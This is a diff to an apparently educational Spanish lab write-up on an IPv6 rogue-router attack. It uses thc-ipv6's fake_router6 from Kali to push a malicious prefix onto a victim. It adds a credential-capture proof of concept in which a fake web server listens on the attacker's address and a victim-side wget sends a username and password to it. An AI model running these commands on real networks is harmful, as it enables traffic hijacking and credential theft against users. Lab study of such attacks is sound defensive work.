@@ -26,7 +26,7 @@ El ataque consiste en introducir un **"Rogue Router"** (Router falso) en la red 
 
 ## 3. Procedimiento del Ataque.
 
-### Paso 1: Preparación del Atacante:
+### Paso 1: Preparación del Atacante.
 Primero, instalamos las herramientas necesarias en Kali Linux y nos asignamos una IP estática dentro del rango malicioso que vamos a inyectar (`2001:1234::/64`) para actuar como gateway.
 
 #### 1. Instalación de la suite thc-ipv6:
@@ -39,7 +39,7 @@ sudo ip -6 addr add 2001:1234::1/64 dev eth0
 ```
 
 
-### Paso 2: Despliegue del Rogue Router:
+### Paso 2: Despliegue del Rogue Router.
 Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.
 
 #### Comando para iniciar el anuncio de router falso:
@@ -48,7 +48,7 @@ sudo atk6-fake_router6 eth0 2001:1234::/64
 ```
 
 
-### Paso 3: Verificación en la Víctima (Infección)
+### Paso 3: Verificación en la Víctima (Infección).
 En la máquina víctima (Ubuntu), comprobamos que el ataque ha tenido éxito. 
 
 #### Revisión de la interfaz obtenida:
@@ -56,3 +56,24 @@ En la máquina víctima (Ubuntu), comprobamos que el ataque ha tenido éxito.
 ip a
 ```
 Al ejecutar `ip a`, observamos que la interfaz ha recibido automáticamente una dirección global del rango `2001:1234...` mediante SLAAC.
+
+
+
+## 4. Captura de Credenciales (PoC).
+Para demostrar el riesgo crítico de esta vulnerabilidad, levantamos un servidor web falso en el atacante y simulamos una conexión de la víctima.
+
+### Paso 1: Servidor de escucha.
+En el Atacante (Kali): Levantamos un servidor escuchando específicamente en la IP maliciosa:
+```bash
+sudo python3 -m http.server 80 --bind 2001:1234::1
+```
+
+### Paso 2: Simulación de envío de credenciales.
+En la Víctima (Ubuntu): Simulamos el envío de credenciales mediante una petición HTTP:
+```bash
+wget "[http://[2001:1234::1]/login?usuario=admin&pass=capturado](http://[2001:1234::1]/login?usuario=admin&pass=capturado)"
+```
+o
+```bash
+firefox "http://[2001:1234::1]/login?usuario=admin&pass=capturado"
+```
